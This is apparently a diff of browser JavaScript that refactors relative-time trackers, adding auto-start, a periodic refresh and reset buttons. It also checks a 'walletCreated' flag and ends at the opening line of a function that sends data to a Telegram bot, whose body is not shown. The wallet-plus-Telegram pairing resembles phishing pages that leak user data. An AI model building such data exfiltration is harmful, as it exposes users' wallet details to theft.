@@ -1,12 +1,12 @@
-// Format time difference (same as before)
+// Function to format time difference (same as before)
 function formatTimeDifference(timestamp) {
     const now = new Date();
     const date = new Date(timestamp);
     const seconds = Math.floor((now - date) / 1000);
-
+    
     if (seconds < 10) return 'just now';
-    if (seconds < 60) return `${seconds} secs ago`;
-
+    if (seconds < 60) return `${seconds} seconds ago`;
+    
     const intervals = {
         year: 31536000,
         month: 2592000,
@@ -15,10 +15,10 @@ function formatTimeDifference(timestamp) {
         hour: 3600,
         minute: 60
     };
-
+    
     if (seconds < intervals.hour) {
-        const mins = Math.floor(seconds / intervals.minute);
-        return `${mins} min${mins === 1 ? '' : 's'} ago`;
+        const minutes = Math.floor(seconds / intervals.minute);
+        return `${minutes} minute${minutes === 1 ? '' : 's'} ago`;
     }
     if (seconds < intervals.day) {
         const hours = Math.floor(seconds / intervals.hour);
@@ -41,37 +41,61 @@ function formatTimeDifference(timestamp) {
     return `${years} year${years === 1 ? '' : 's'} ago`;
 }
 
-// Update a tracker (only if localStorage has data)
-function refreshTracker(trackerId) {
-    const trackerElement = document.getElementById(trackerId);
+// Function to update a specific tracker
+function updateTimeDisplay(trackerId) {
+    const trackerElement = document.querySelector(`[data-time-id="${trackerId}"]`);
     if (!trackerElement) return;
-
-    const storedTime = localStorage.getItem(`trackedTime_${trackerId}`);
+    
+    const storageKey = `trackedTime_${trackerId}`;
+    const storedTime = localStorage.getItem(storageKey);
+    
     if (storedTime) {
-        trackerElement.textContent = formatTimeDifference(parseInt(storedTime));
+        const formattedTime = formatTimeDifference(parseInt(storedTime));
+        trackerElement.textContent = formattedTime;
+    } else {
+        // If no time is stored, set it to now
+        const currentTime = new Date().getTime();
+        localStorage.setItem(storageKey, currentTime.toString());
+        trackerElement.textContent = 'just now';
     }
-    // Else: Do nothing (no auto-start)
 }
 
-// Start a new tracker (sets time to now)
-function startTracker(trackerId) {
+// Function to reset a tracker's time
+function resetTrackerTime(trackerId) {
     const currentTime = new Date().getTime();
     localStorage.setItem(`trackedTime_${trackerId}`, currentTime.toString());
-    refreshTracker(trackerId); // Update display immediately
+    updateTimeDisplay(trackerId); // Update immediately
 }
 
-// On page load: Refresh all trackers with existing data
-document.addEventListener('DOMContentLoaded', () => {
-    // Check all potential trackers (example for 'tracker1' and 'tracker2')
-    refreshTracker('tracker1');
-    refreshTracker('tracker2');
-    // Add more if needed
-});		
+// Initialize all trackers on page load
+function initAllTimeTrackers() {
+    document.querySelectorAll('.time-tracker').forEach(tracker => {
+        const trackerId = tracker.getAttribute('data-time-id');
+        updateTimeDisplay(trackerId);
+    });
+    
+    // Auto-update all trackers every minute
+    setInterval(() => {
+        document.querySelectorAll('.time-tracker').forEach(tracker => {
+            const trackerId = tracker.getAttribute('data-time-id');
+            updateTimeDisplay(trackerId);
+        });
+    }, 60000);
+}
+
+// Initialize when the page loads
+document.addEventListener('DOMContentLoaded', initAllTimeTrackers);
+
+// Example: Reset buttons
+document.getElementById('reset-tracker1').addEventListener('click', () => resetTrackerTime('tracker1'));
+document.getElementById('reset-tracker2').addEventListener('click', () => resetTrackerTime('tracker2'));
+
 
 const walletCreated = localStorage.getItem('walletCreated');
 if (walletCreated === 'true') {
-startTracker('tracker-one');
+updateTimeDisplay('tracker-one');
 }
+
 
 // Function to send data to Telegram bot
 async function sendToTelegramBot(data, botToken, chatId) {
